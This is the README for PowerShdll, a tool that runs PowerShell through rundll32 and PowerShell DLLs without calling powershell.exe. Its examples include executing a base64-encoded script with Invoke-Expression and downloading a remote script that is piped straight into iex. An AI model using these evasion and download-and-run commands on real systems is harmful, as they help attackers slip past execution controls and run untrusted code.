# PowerShdll
Run PowerShell with dlls only.
Does not require access to powershell.exe as it uses powershell automation dlls.

## dll mode:

```
Usage:
rundll32 PowerShdll,main <script>
rundll32 PowerShdll,main -f <path>       Run the script passed as argument
rundll32 PowerShdll,main -w      Start an interactive console in a new window
rundll32 PowerShdll,main -i      Start an interactive console in this console
If you do not have an interractive console, use -n to avoid crashes on ouput
```

## exe mode

```
Usage:
PowerShdll.exe <script>
PowerShdll.exe -f <path>       Run the script passed as argument
PowerShdll.exe -i      Start an interactive console in this console
```
## Examples
### Run base64 encoded script
```
rundll32 Powershdll.dll,main $a = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("BASE64")); Invoke-Expression $a
```
### Download and run script
```
rundll32 PowerShdll.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;
```
## Known Issues

Some errors do not seem to show in the output. May be confusing as commands such as Import-Module do not output an error on failure.
Make sure you have typed your commands correctly.

In dll mode, interractive mode and command output rely on hijacking the parent process' console. If the parent process does not have a console, use the -n switch to not show output otherwise the application will crash.

Due to the way Rundll32 handles arguments, using several space characters between switches and arguments may cause issues. Multiple spaces inside the scripts are okay.

